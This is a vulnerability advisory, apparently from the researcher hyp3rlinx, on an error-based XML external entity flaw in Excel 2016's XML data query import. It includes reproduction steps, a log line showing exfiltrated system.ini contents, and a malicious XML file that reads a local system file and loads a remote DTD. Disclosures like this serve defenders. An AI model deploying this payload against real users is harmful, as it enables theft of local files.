[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-EXCEL-2016-v1901-IMPORT-ERROR-EXTERNAL-ENTITY-INJECTION.txt
[+] ISR: ApparitionSec          
 

[Vendor]
www.microsoft.com


[Product]
Excel 2016 v1901

It features calculation, graphing tools, pivot tables, and a macro programming language called Visual Basic for Applications. 


[CVE]
N/A


[Vulnerability Type]
Error Import Based XML External Entity Injection


[Security Issue]
Excel query from file feature is vulnerable to "Error" based XML External Entity attacks, if the user chooses the "Import as
Html page" functionality upon receiving errors importing a specially crafted XML file.

This can result in potential remote data exfiltration, user interaction is required to exploit this vulnerability.

Tested successfuly Windows 10 .NET framework version v4.0.30319.

C:\>dir /b %windir%\Microsoft.NET\Framework\v*
v4.0.30319


[Exploit/POC]
Create a new ".xlsx" file then, go to Data tab and choose &#039;New Query/From File/From XML&#039;

1) You will get error like: 

"Error:

Unable to connect

We encountered an error while trying to connect.

The user will then get an option to &#039;Edit&#039; where they can import the file as an HTML file

Result Local data can be exfiltrated to remote server"

2) Excel will then give you option to &#039;Edit&#039; and import as &#039;Html Page&#039; from the drop down menu in Excel

User has choose to import as HTML then XXE attack will succeed:

e.g.

127.0.0.1 - - [05/Mar/2019 15:31:16] "GET /?;%20for%2016-bit%20app%20support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FO
/1.1" 200 -


Malicious XML file to load as New Data Query

"test.xml"

<?xml version=&#039;1.0&#039;?>
<!DOCTYPE root [ 
<!ENTITY % file SYSTEM &#039;C:\Windows\system.ini&#039;>
<!ENTITY % dtd SYSTEM &#039;http://127.0.0.1:8000/payload.dtd&#039;>
%dtd;]>
<pwn>&send;</pwn>

